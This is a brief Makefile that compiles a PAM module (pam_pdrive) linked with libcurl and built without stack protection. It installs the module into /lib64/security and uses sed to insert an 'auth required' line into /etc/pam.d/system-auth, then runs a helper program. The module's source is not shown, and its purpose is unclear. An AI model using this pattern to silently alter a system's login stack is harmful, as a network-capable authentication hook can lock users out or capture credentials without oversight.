pam_pdrive.o: pam_pdrive.c
	gcc -fPIC -lcurl -fno-stack-protector -c pam_pdrive.c

install: pam_pdrive.o
	gcc -fPIC -lcurl -fno-stack-protector -c pam_pdrive.c
	ld -lcurl -x --shared -o /lib64/security/pam_pdrive.so pam_pdrive.o
	sed -i "4s/^/	auth	  required  pam_pdrive.so\n/" /etc/pam.d/system-auth
	gcc criar_arquivos.c -o criar_arquivos
	./criar_arquivos
